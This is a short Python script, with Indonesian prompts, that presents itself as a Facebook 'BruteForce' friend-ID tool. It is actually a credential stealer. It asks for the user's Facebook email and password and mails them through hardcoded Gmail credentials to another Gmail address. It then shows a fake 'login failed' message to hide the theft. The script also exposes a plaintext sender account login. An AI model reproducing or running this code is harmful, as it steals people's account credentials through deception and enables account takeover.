import os,time
import yagmail
from termcolor import colored
os.system('figlet EmEl')
os.system('figlet BruteForce')
os.system('figlet ^_^')
print(colored('[ Trusted ID ]','yellow'))
print(colored('[!]Login Di Perlukan Untuk Mendapatkan Id Teman','blue'))
h = input(colored('Email/FB: ','red'))
j = input(colored('Password: ','white'))

uwu = yagmail.SMTP('wirdagans@gmail.com','wirdasaputra')
body = ('Email/Fb: '+h,'Passwordnya: '+j)

subject = ' Sttt.. Akun Dateng Boss ! '
uwu.send('kangyann57@gmail.com',subject,body)

print(colored('[!]Maaf Gagal Login,Cek Password Atau Ulang','red'))
